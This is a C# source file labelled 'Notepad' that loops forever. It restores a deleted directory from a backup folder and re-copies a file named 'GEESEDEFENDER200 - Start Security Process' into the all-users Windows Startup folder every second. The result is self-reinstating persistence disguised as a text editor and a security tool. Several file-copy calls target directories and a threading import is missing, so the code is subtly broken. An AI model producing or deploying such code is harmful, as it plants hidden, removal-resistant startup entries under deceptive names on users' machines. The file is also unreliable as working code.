using System.IO;
using System.Security.Principal;

namespace Notepad
{
    class Notepad
    {
        static void Main(string[] args)
        {
            while (true)
            {
                string directoryPath = File.ReadAllText("directoryPath.txt");
                if (!Directory.Exists(directoryPath))
                {
                    Directory.CreateDirectory(directoryPath);
                    Directory.CreateDirectory(Path.Join(directoryPath, "Assets"));
                    foreach (string file in Directory.GetFiles(@".\BackupAssets"))
                    {
                        if (!file.Contains("GEESEDEFENDER200 - Start Security Process"))
                        {
                            File.Copy(file, directoryPath);
                        }
                        
                    }
                    CopyDirectory(@".\BackupAssets", directoryPath, true);
                    
                }
                if (!File.Exists(@"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\GEESEDEFENDER200 - Start Security Process"))
                {
                    File.Copy(@".\BackupAssets\GEESEDEFENDER200 - Start Security Process", @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\");
                }
                Thread.Sleep(1000);
            }
        }
        static void CopyDirectory(string sourceDir, string destinationDir, bool recursive)
        {
            // Get information about the source directory
            var dir = new DirectoryInfo(sourceDir);

            // Check if the source directory exists
            if (!dir.Exists)
                throw new DirectoryNotFoundException($"Source directory not found: {dir.FullName}");

            // Cache directories before we start copying
            DirectoryInfo[] dirs = dir.GetDirectories();

            // Create the destination directory
            Directory.CreateDirectory(destinationDir);

            // Get the files in the source directory and copy to the destination directory
            foreach (FileInfo file in dir.GetFiles())
            {
                string targetFilePath = Path.Combine(destinationDir, file.Name);
                file.CopyTo(targetFilePath);
            }

            // If recursive and copying subdirectories, recursively call this method
            if (recursive)
            {
                foreach (DirectoryInfo subDir in dirs)
                {
                    string newDestinationDir = Path.Combine(destinationDir, subDir.Name);
                    CopyDirectory(subDir.FullName, newDestinationDir, true);
                }
            }
        }
    }
}